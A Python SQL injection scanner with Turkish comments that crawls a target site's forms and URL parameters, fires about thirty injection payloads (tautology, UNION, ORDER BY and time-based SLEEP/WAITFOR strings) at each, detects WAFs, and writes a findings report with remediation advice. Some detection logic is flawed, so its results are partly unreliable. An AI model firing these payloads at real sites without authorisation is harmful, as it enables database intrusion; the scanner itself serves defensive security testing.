import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, parse_qs, urlparse
import time
import re

class SQLInjectionScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            '" OR "1"="1',
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "1' AND SLEEP(5)--",
            "1' AND BENCHMARK(5000000,MD5(1))--",
            "1' WAITFOR DELAY '0:0:5'--",
            "1'; IF (1=1) WAITFOR DELAY '0:0:5'--",
            "1'; SELECT pg_sleep(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' or ''-'",
            "' or '' '",
            "' or ''&'",
            "' or ''^'",
            "' or ''*'",
            "or 1=1--",
            "or 1=1#",
            "or 1=1/*",
            ") or '1'='1--",
            ") or ('1'='1--"
        ]
        
    def find_inputs(self, url):
        """Form ve URL parametrelerini bulur"""
        inputs = []
        try:
            response = requests.get(url, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Form inputlarını bul
            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action', '')
                if not action:
                    action = url
                else:
                    action = urljoin(url, action)
                    
                method = form.get('method', 'get').lower()
                form_inputs = []
                
                # Input alanlarını topla
                for input_tag in form.find_all(['input', 'textarea']):
                    input_type = input_tag.get('type', '').lower()
                    input_name = input_tag.get('name', '')
                    
                    if input_name and input_type not in ['submit', 'button', 'image', 'reset', 'file']:
                        form_inputs.append(input_name)
                        
                if form_inputs:
                    inputs.append({
                        'url': action,
                        'method': method,
                        'inputs': form_inputs
                    })
            
            # URL parametrelerini bul
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            if params:
                inputs.append({
                    'url': url,
                    'method': 'get',
                    'inputs': list(params.keys())
                })
                
            return inputs
            
        except Exception as e:
            return []
            
    def test_input(self, input_data, payload):
        """SQL Injection payload'ını test eder"""
        try:
            url = input_data['url']
            method = input_data['method']
            test_data = {}
            
            # Her input için payload'ı dene
            for input_name in input_data['inputs']:
                test_data[input_name] = payload
            
            # Başlangıç zamanını kaydet
            start_time = time.time()
            
            # İsteği gönder
            if method == 'get':
                response = requests.get(url, params=test_data, verify=False)
            else:
                response = requests.post(url, data=test_data, verify=False)
            
            # Geçen süreyi hesapla
            elapsed_time = time.time() - start_time
            
            # Yanıtı analiz et
            content = response.text.lower()
            
            # SQL hata mesajlarını kontrol et
            sql_errors = [
                'sql syntax',
                'mysql error',
                'mysql_fetch',
                'mysql_num_rows',
                'mysql_result',
                'postgresql error',
                'ora-00933',
                'ora-01756',
                'ora-00942',
                'ora-01789',
                'ora-01017',
                'ora-01722',
                'ora-00904',
                'ora-01722',
                'ora-00936',
                'ora-00921',
                'unclosed quotation mark',
                'quoted string not properly terminated',
                'sqlserver',
                'sql server',
                'syntax error',
                'incorrect syntax',
                'unexpected end of command',
                'division by zero',
                'supplied argument is not a valid mysql',
                'call to a member function',
                'invalid query',
                'cli driver',
                'mysql_connect',
                'access violation',
                'invalid object name',
                'sqlstate',
                'database error',
                'sqlite_error',
                'column not found',
                'table not found'
            ]
            
            # Hata tabanlı SQL Injection
            for error in sql_errors:
                if error in content:
                    return {
                        'type': 'error',
                        'evidence': error
                    }
            
            # Time-based SQL Injection
            if elapsed_time > 5 and 'SLEEP' in payload:
                return {
                    'type': 'time',
                    'evidence': f'Response time: {elapsed_time:.2f} seconds'
                }
            
            # Boolean-based SQL Injection
            if 'AND 1=1' in payload and 'AND 1=2' in payload:
                response2 = requests.get(url, params={'param': payload.replace('1=1', '1=2')}, verify=False) \
                          if method == 'get' else \
                          requests.post(url, data={'param': payload.replace('1=1', '1=2')}, verify=False)
                          
                if len(response.text) != len(response2.text):
                    return {
                        'type': 'boolean',
                        'evidence': 'Different response lengths'
                    }
            
            return None
            
        except Exception as e:
            return None
            
    def check_waf(self, url):
        """WAF koruması var mı kontrol eder"""
        try:
            response = requests.get(url, verify=False)
            headers = str(response.headers).lower()
            
            waf_indicators = [
                'waf',
                'firewall',
                'security',
                'cloudflare',
                'akamai',
                'incapsula',
                'f5',
                'fortinet',
                'barracuda',
                'citrix',
                'imperva',
                'wordfence'
            ]
            
            for indicator in waf_indicators:
                if indicator in headers:
                    return True
                    
            return False
            
        except:
            return False
            
    def scan(self):
        """SQL Injection zafiyetlerini test eder"""
        result = {
            "title": "SQL Injection Testi",
            "findings": []
        }
        
        try:
            # WAF kontrolü
            has_waf = self.check_waf(self.target_url)
            if has_waf:
                result["findings"].append({
                    "name": "WAF Koruması Tespit Edildi",
                    "description": "Web Application Firewall (WAF) koruması aktif",
                    "risk_level": "Bilgi",
                    "impact": "SQL Injection saldırıları WAF tarafından engellenebilir",
                    "recommendation": "WAF kurallarını güncel ve aktif tutun"
                })
            
            # Input noktalarını bul
            inputs = self.find_inputs(self.target_url)
            
            if not inputs:
                result["findings"].append({
                    "name": "Test Edilebilir Input Bulunamadı",
                    "description": "SQL Injection testi için uygun form veya URL parametresi bulunamadı",
                    "risk_level": "Bilgi",
                    "impact": "Test yapılamadı",
                    "recommendation": "Veritabanı işlemleri yapan sayfaları kontrol edin"
                })
                return result
            
            # Her input için SQL Injection testleri yap
            vulnerable_inputs = []
            
            for input_data in inputs:
                for payload in self.sql_payloads:
                    finding = self.test_input(input_data, payload)
                    if finding:
                        input_url = input_data['url']
                        input_method = input_data['method']
                        input_names = ', '.join(input_data['inputs'])
                        
                        vuln = {
                            'url': input_url,
                            'method': input_method,
                            'inputs': input_names,
                            'payload': payload,
                            'type': finding['type'],
                            'evidence': finding['evidence']
                        }
                        
                        if vuln not in vulnerable_inputs:
                            vulnerable_inputs.append(vuln)
            
            # Bulunan zafiyetleri raporla
            if vulnerable_inputs:
                for vuln in vulnerable_inputs:
                    result["findings"].append({
                        "name": f"SQL Injection Zafiyeti ({vuln['type'].upper()})",
                        "description": f"URL: {vuln['url']}\n" + \
                                     f"Method: {vuln['method'].upper()}\n" + \
                                     f"Inputs: {vuln['inputs']}\n" + \
                                     f"Payload: {vuln['payload']}\n" + \
                                     f"Kanıt: {vuln['evidence']}",
                        "risk_level": "Kritik",
                        "impact": "Saldırganlar veritabanı üzerinde yetkisiz işlemler yapabilir",
                        "recommendation": "\n".join([
                            "1. Prepared statement veya stored procedure kullanın",
                            "2. Input validasyonu ve sanitizasyonu yapın",
                            "3. En az yetki prensibini uygulayın",
                            "4. Web Application Firewall (WAF) kullanın",
                            "5. Hata mesajlarını gizleyin",
                            "6. Database kullanıcı yetkilerini sınırlayın"
                        ])
                    })
            else:
                result["findings"].append({
                    "name": "SQL Injection Zafiyeti Tespit Edilmedi",
                    "description": "Test edilen noktalarda SQL Injection zafiyeti bulunamadı",
                    "risk_level": "Bilgi",
                    "impact": "Yok",
                    "recommendation": "Düzenli güvenlik kontrollerine devam edin"
                })
                
        except Exception as e:
            result["findings"].append({
                "name": "Tarama Hatası",
                "description": f"SQL Injection taraması sırasında hata: {str(e)}",
                "risk_level": "Hata",
                "impact": "SQL Injection zafiyetleri belirlenemedi",
                "recommendation": "Sistem yöneticinize başvurun"
            })
            
        return result 